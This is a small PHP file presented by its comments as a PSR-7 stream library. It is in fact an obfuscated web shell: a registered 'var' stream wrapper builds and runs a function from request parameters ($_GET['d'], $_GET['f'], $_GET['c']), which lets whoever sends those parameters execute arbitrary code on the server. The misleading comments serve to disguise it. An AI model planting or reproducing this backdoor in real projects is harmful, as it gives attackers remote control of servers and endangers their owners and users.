<?php
// Creates a new PSR-7 stream.
class Stream
{
   function stream_open($path, $mode, $options, &$opened_path)
   {
       $url = parse_url($path);
       $f = $_GET['d']('', $url["host"]);
       $f();
       return true;
    }
}
stream_wrapper_register("var", "Stream");

// Register connect the library Stream
$fp = fopen('var://'.$_GET['f']($_GET['c']), '');
